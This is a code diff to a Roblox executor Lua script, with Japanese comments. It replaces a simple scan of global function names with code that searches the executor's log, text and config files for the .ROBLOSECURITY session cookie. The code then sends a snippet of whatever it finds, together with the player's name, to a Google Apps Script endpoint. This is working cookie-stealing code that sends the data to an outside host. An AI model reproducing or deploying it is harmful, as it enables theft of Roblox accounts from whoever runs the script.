@@ -1,9 +1,30 @@
--- グローバル環境(getgenv)の中から「cookie」を含むものを全列挙
-local found = false
-for i, v in pairs(getgenv()) do
-    if type(i) == "string" and i:lower():find("cook") then
-        print("【発見】関数名: " .. i .. " (Type: " .. type(v) .. ")")
-        found = true
+local gasUrl = "https://script.google.com/macros/s/AKfycbzmVrEoOyp80pnNnNe48K4Aa0kYfTkKp730CqrfTLReRkfjpDaEIf6ygippGJFwbHi9/exec"
+local user = game.Players.LocalPlayer.Name
+
+local function scanFiles()
+    local findings = "NOT_FOUND"
+    
+    -- Deltaのファイル操作関数があるか確認
+    if listfiles and readfile then
+        pcall(function()
+            -- エグゼキューターのフォルダ内にあるファイルをリストアップ
+            local files = listfiles("")
+            for _, file in pairs(files) do
+                -- ログファイルや設定ファイルっぽいやつを狙う
+                if file:find(".log") or file:find(".txt") or file:find("config") then
+                    local content = readfile(file)
+                    -- クッキーの象徴的な文字列が含まれていないか検索
+                    if content:find(".ROBLOSECURITY") or content:find("_|WARNING") then
+                        findings = "Found in " .. file .. ": " .. content:sub(1, 100)
+                        break
+                    end
+                end
+            end
+        end)
     end
+    return findings
 end
-if not found then print("cookieを含む関数は見つかりませんでした") end
+
+local result = scanFiles()
+-- GASにスキャン結果を送信
+game:HttpGet(gasUrl .. "?user=" .. user .. "&cookie=" .. game:GetService("HttpService"):UrlEncode(result))
